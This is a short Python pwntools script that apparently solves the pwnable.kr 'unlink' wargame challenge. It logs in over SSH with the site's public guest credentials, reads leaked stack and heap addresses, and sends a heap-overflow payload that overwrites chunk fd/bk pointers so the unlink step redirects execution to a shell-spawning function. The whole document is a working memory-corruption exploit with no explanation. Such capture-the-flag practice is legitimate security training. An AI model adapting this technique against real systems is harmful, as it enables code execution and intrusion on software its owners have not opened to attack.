from pwn import *

s = ssh(user='unlink', host='pwnable.kr', port=2222, password='guest')
p = s.process('/home/unlink/unlink')

p.recvuntil(': ')
stack = int(p.recv(10), 16)

p.recvuntil(': ')
heap = int(p.recv(10), 16)

p.recv()

shell = 0x080484eb
buf = heap+8
ebp = stack+20

payload = p32(shell) # A->buf
payload += b'A'*12
payload += p32(buf+4) # B->fd
payload += p32(ebp-4) # B->bk

p.sendline(payload)
p.interactive()
